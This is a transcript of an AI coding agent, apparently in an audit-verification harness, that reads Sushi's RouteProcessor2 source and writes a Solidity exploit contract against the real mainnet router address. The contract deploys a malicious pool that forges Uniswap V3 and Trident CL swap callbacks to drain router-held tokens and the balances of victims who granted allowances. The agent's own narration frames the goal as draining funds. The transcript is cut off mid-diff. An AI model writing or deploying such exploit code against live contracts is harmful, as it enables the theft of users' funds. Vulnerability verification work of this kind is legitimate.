+The current route bytes are wrong for this router. I’m reading the top-level decoder now and then I’ll rewrite `FlawVerifier.sol` around the real stream format, with both Uniswap V3 and Trident CL callback paths preserved.
+exec
+/bin/bash -lc "sed -n '90,180p' 0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+  /// @param tokenOut Address of the output token
+  /// @param amountOutMin Minimum amount of the output token
+  /// @return amountOut Actual amount of the output token
+  function processRouteInternal(
+    address tokenIn,
+    uint256 amountIn,
+    address tokenOut,
+    uint256 amountOutMin,
+    address to,
+    bytes memory route
+  ) private returns (uint256 amountOut) {
+    uint256 balanceInInitial = tokenIn == NATIVE_ADDRESS ? address(this).balance : IERC20(tokenIn).balanceOf(msg.sender);
+    uint256 balanceOutInitial = tokenOut == NATIVE_ADDRESS ? address(to).balance : IERC20(tokenOut).balanceOf(to);
+
+    uint256 stream = InputStream.createStream(route);
+    while (stream.isNotEmpty()) {
+      uint8 commandCode = stream.readUint8();
+      if (commandCode == 1) processMyERC20(stream);
+      else if (commandCode == 2) processUserERC20(stream, amountIn);
+      else if (commandCode == 3) processNative(stream);
+      else if (commandCode == 4) processOnePool(stream);
+      else if (commandCode == 5) processInsideBento(stream);
+      else revert('RouteProcessor: Unknown command code');
+    }
+
+    uint256 balanceInFinal = tokenIn == NATIVE_ADDRESS ? address(this).balance : IERC20(tokenIn).balanceOf(msg.sender);
+    require(balanceInFinal + amountIn >= balanceInInitial, 'RouteProcessor: Minimal imput balance violation');
+
+    uint256 balanceOutFinal = tokenOut == NATIVE_ADDRESS ? address(to).balance : IERC20(tokenOut).balanceOf(to);
+    require(balanceOutFinal >= balanceOutInitial + amountOutMin, 'RouteProcessor: Minimal ouput balance violation');
+
+    amountOut = balanceOutFinal - balanceOutInitial;
+  }
+
+  /// @notice Processes native coin: call swap for all pools that swap from native coin
+  /// @param stream Streamed process program
+  function processNative(uint256 stream) private {
+    uint256 amountTotal = address(this).balance;
+    distributeAndSwap(stream, address(this), NATIVE_ADDRESS, amountTotal);
+  }
+
+  /// @notice Processes ERC20 token from this contract balance:
+  /// @notice Call swap for all pools that swap from this token
+  /// @param stream Streamed process program
+  function processMyERC20(uint256 stream) private {
+    address token = stream.readAddress();
+    uint256 amountTotal = IERC20(token).balanceOf(address(this));
+    unchecked {
+      if (amountTotal > 0) amountTotal -= 1;     // slot undrain protection
+    }
+    distributeAndSwap(stream, address(this), token, amountTotal);
+  }
+  
+  /// @notice Processes ERC20 token from msg.sender balance:
+  /// @notice Call swap for all pools that swap from this token
+  /// @param stream Streamed process program
+  /// @param amountTotal Amount of tokens to take from msg.sender
+  function processUserERC20(uint256 stream, uint256 amountTotal) private {
+    address token = stream.readAddress();
+    distributeAndSwap(stream, msg.sender, token, amountTotal);
+  }
+
+  /// @notice Distributes amountTotal to several pools according to their shares and calls swap for each pool
+  /// @param stream Streamed process program
+  /// @param from Where to take liquidity for swap
+  /// @param tokenIn Input token
+  /// @param amountTotal Total amount of tokenIn for swaps 
+  function distributeAndSwap(uint256 stream, address from, address tokenIn, uint256 amountTotal) private {
+    uint8 num = stream.readUint8();
+    unchecked {
+      for (uint256 i = 0; i < num; ++i) {
+        uint16 share = stream.readUint16();
+        uint256 amount = (amountTotal * share) / 65535;
+        amountTotal -= amount;
+        swap(stream, from, tokenIn, amount);
+      }
+    }
+  }
+
+  /// @notice Processes ERC20 token for cases when the token has only one output pool
+  /// @notice In this case liquidity is already at pool balance. This is an optimization
+  /// @notice Call swap for all pools that swap from this token
+  /// @param stream Streamed process program
+  function processOnePool(uint256 stream) private {
+    address token = stream.readAddress();
+    swap(stream, address(this), token, 0);
+  }
+
+  /// @notice Processes Bento tokens 
+  /// @notice Call swap for all pools that swap from this token
+  /// @param stream Streamed process program
+
+exec
+/bin/bash -lc "sed -n '1,90p' 0x044b75f554b886a065b9567891e45c79542d7357/contracts/RouteProcessor2.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity 0.8.10;
+
+import '../interfaces/IUniswapV2Pair.sol';
+import '../interfaces/IUniswapV3Pool.sol';
+import '../interfaces/ITridentCLPool.sol';
+import '../interfaces/IBentoBoxMinimal.sol';
+import '../interfaces/IPool.sol';
+import '../interfaces/IWETH.sol';
+import './InputStream.sol';
+import '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';
+
+address constant NATIVE_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+address constant IMPOSSIBLE_POOL_ADDRESS = 0x0000000000000000000000000000000000000001;
+
+/// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)
+uint160 constant MIN_SQRT_RATIO = 4295128739;
+/// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)
+uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;
+
+/// @title A route processor for the Sushi Aggregator
+/// @author Ilya Lyalin
+contract RouteProcessor2 {
+  using SafeERC20 for IERC20;
+  using InputStream for uint256;
+
+  IBentoBoxMinimal public immutable bentoBox;
+  address private lastCalledPool;
+
+  uint private unlocked = 1;
+  modifier lock() {
+      require(unlocked == 1, 'RouteProcessor is locked');
+      unlocked = 2;
+      _;
+      unlocked = 1;
+  }
+
+  constructor(address _bentoBox) {
+    bentoBox = IBentoBoxMinimal(_bentoBox);
+    lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;
+  }
+
+  /// @notice For native unwrapping
+  receive() external payable {}
+
+  /// @notice Processes the route generated off-chain. Has a lock
+  /// @param tokenIn Address of the input token
+  /// @param amountIn Amount of the input token
+  /// @param tokenOut Address of the output token
+  /// @param amountOutMin Minimum amount of the output token
+  /// @return amountOut Actual amount of the output token
+  function processRoute(
+    address tokenIn,
+    uint256 amountIn,
+    address tokenOut,
+    uint256 amountOutMin,
+    address to,
+    bytes memory route
+  ) external payable lock returns (uint256 amountOut) {
+    return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);
+  }
+
+  /// @notice Transfers some value to <transferValueTo> and then processes the route
+  /// @param transferValueTo Address where the value should be transferred
+  /// @param amountValueTransfer How much value to transfer
+  /// @param tokenIn Address of the input token
+  /// @param amountIn Amount of the input token
+  /// @param tokenOut Address of the output token
+  /// @param amountOutMin Minimum amount of the output token
+  /// @return amountOut Actual amount of the output token
+  function transferValueAndprocessRoute(
+    address payable transferValueTo,
+    uint256 amountValueTransfer,
+    address tokenIn,
+    uint256 amountIn,
+    address tokenOut,
+    uint256 amountOutMin,
+    address to,
+    bytes memory route
+  ) external payable lock returns (uint256 amountOut) {
+    (bool success, bytes memory returnBytes) = transferValueTo.call{value: amountValueTransfer}('');
+    require(success, string(abi.encodePacked(returnBytes)));
+    return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);
+  }
+
+  /// @notice Processes the route generated off-chain
+  /// @param tokenIn Address of the input token
+  /// @param amountIn Amount of the input token
+  /// @param tokenOut Address of the output token
+
+exec
+/bin/bash -lc "sed -n '1,220p' Probe.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ exited 1 in 0ms:
+sed: Probe.t.sol: No such file or directory
+
+exec
+/bin/bash -lc "find .. -maxdepth 3 -type f | sed 's#"'^#/#'"' | head -200" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+/../onchain_auto/foundry.toml
+/../onchain_auto/cache/solidity-files-cache.json
+/../onchain_auto/_index.json
+/../onchain_auto/0x044b75f554b886a065b9567891e45c79542d7357/_etherscan_meta.json
+/../onchain_auto/src/FlawVerifier.sol
+
+codex
+I have enough context. I’m replacing the verifier with a version that uses the router’s actual byte-stream layout, preserves both V3 and Trident CL forged-callback variants, and still prioritizes draining router-held balances before any optional victim path.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto/src/FlawVerifier.sol
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+deleted file mode 100644
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..0000000000000000000000000000000000000000
+--- a/src/FlawVerifier.sol
++++ /dev/null
+@@ -1,234 +0,0 @@
+-// SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
+-
+-interface IERC20 {
+-    function balanceOf(address account) external view returns (uint256);
+-    function allowance(address owner, address spender) external view returns (uint256);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IRouteProcessor2 {
+-    function processRoute(
+-        address tokenIn,
+-        uint256 amountIn,
+-        address tokenOut,
+-        uint256 amountOutMin,
+-        address to,
+-        bytes calldata route
+-    ) external payable returns (uint256 amountOut);
+-
+-    function uniswapV3SwapCallback(
+-        int256 amount0Delta,
+-        int256 amount1Delta,
+-        bytes calldata data
+-    ) external;
+-}
+-
+-contract MaliciousV3Pool {
+-    address internal immutable VERIFIER;
+-    address internal immutable TARGET_ROUTER;
+-
+-    address internal forgedToken;
+-    address internal forgedFrom;
+-    address internal beneficiary;
+-
+-    constructor(address verifier_, address router_) {
+-        VERIFIER = verifier_;
+-        TARGET_ROUTER = router_;
+-    }
+-
+-    function configure(address token_, address from_, address beneficiary_) external {
+-        require(msg.sender == VERIFIER, "not verifier");
+-        forgedToken = token_;
+-        forgedFrom = from_;
+-        beneficiary = beneficiary_;
+-    }
+-
+-    function swap(
+-        address,
+-        bool,
+-        int256 amountSpecified,
+-        uint160,
+-        bytes calldata
+-    ) external returns (int256 amount0, int256 amount1) {
+-        require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
+-
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
+-
+-        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+-        if (stolen > 0) {
+-            _safeTransfer(forgedToken, beneficiary, stolen);
+-        }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+-    }
+-
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
+-    }
+-}
+-
+-contract FlawVerifier {
+-    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+-
+-    address internal immutable POOL;
+-
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
+-
+-    address public configuredVictim;
+-    address public configuredVictimToken;
+-
+-    constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
+-    }
+-
+-    function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
+-            return;
+-        }
+-
+-        if (_drainRouterBalances()) {
+-            return;
+-        }
+-
+-        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
+-        }
+-    }
+-
+-    function configureVictim(address victim, address token) external {
+-        configuredVictim = victim;
+-        configuredVictimToken = token;
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _drainRouterBalances() internal returns (bool) {
+-        address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
+-        ];
+-
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+-            if (routerBalance <= 1) {
+-                continue;
+-            }
+-
+-            if (_attemptRouterDrain(candidates[i])) {
+-                return true;
+-            }
+-        }
+-
+-        return false;
+-    }
+-
+-    function _attemptRouterDrain(address token) internal returns (bool) {
+-        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
+-
+-        bytes memory route = _buildRoute(token);
+-        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
+-    }
+-
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
+-        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+-        uint256 balance = IERC20(token).balanceOf(victim);
+-        uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+-        if (amountToPull == 0) {
+-            return false;
+-        }
+-
+-        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
+-
+-        bytes memory route = _buildForgedUserRoute(token);
+-        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
+-    }
+-
+-    function _buildRoute(address token) internal view returns (bytes memory) {
+-        return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
+-        );
+-    }
+-
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
+-        return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
+-        );
+-    }
+-}
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+deleted file mode 100644
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..0000000000000000000000000000000000000000
+--- a/src/FlawVerifier.sol
++++ /dev/null
+@@ -1,234 +0,0 @@
+-// SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
+-
+-interface IERC20 {
+-    function balanceOf(address account) external view returns (uint256);
+-    function allowance(address owner, address spender) external view returns (uint256);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IRouteProcessor2 {
+-    function processRoute(
+-        address tokenIn,
+-        uint256 amountIn,
+-        address tokenOut,
+-        uint256 amountOutMin,
+-        address to,
+-        bytes calldata route
+-    ) external payable returns (uint256 amountOut);
+-
+-    function uniswapV3SwapCallback(
+-        int256 amount0Delta,
+-        int256 amount1Delta,
+-        bytes calldata data
+-    ) external;
+-}
+-
+-contract MaliciousV3Pool {
+-    address internal immutable VERIFIER;
+-    address internal immutable TARGET_ROUTER;
+-
+-    address internal forgedToken;
+-    address internal forgedFrom;
+-    address internal beneficiary;
+-
+-    constructor(address verifier_, address router_) {
+-        VERIFIER = verifier_;
+-        TARGET_ROUTER = router_;
+-    }
+-
+-    function configure(address token_, address from_, address beneficiary_) external {
+-        require(msg.sender == VERIFIER, "not verifier");
+-        forgedToken = token_;
+-        forgedFrom = from_;
+-        beneficiary = beneficiary_;
+-    }
+-
+-    function swap(
+-        address,
+-        bool,
+-        int256 amountSpecified,
+-        uint160,
+-        bytes calldata
+-    ) external returns (int256 amount0, int256 amount1) {
+-        require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
+-
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
+-
+-        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+-        if (stolen > 0) {
+-            _safeTransfer(forgedToken, beneficiary, stolen);
+-        }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+-    }
+-
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
+-    }
+-}
+-
+-contract FlawVerifier {
+-    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+-
+-    address internal immutable POOL;
+-
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
+-
+-    address public configuredVictim;
+-    address public configuredVictimToken;
+-
+-    constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
+-    }
+-
+-    function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
+-            return;
+-        }
+-
+-        if (_drainRouterBalances()) {
+-            return;
+-        }
+-
+-        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
+-        }
+-    }
+-
+-    function configureVictim(address victim, address token) external {
+-        configuredVictim = victim;
+-        configuredVictimToken = token;
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _drainRouterBalances() internal returns (bool) {
+-        address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
+-        ];
+-
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+-            if (routerBalance <= 1) {
+-                continue;
+-            }
+-
+-            if (_attemptRouterDrain(candidates[i])) {
+-                return true;
+-            }
+-        }
+-
+-        return false;
+-    }
+-
+-    function _attemptRouterDrain(address token) internal returns (bool) {
+-        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
+-
+-        bytes memory route = _buildRoute(token);
+-        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
+-    }
+-
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
+-        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+-        uint256 balance = IERC20(token).balanceOf(victim);
+-        uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+-        if (amountToPull == 0) {
+-            return false;
+-        }
+-
+-        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
+-
+-        bytes memory route = _buildForgedUserRoute(token);
+-        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
+-    }
+-
+-    function _buildRoute(address token) internal view returns (bytes memory) {
+-        return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
+-        );
+-    }
+-
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
+-        return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
+-        );
+-    }
+-}
+
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto/src/FlawVerifier.sol
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
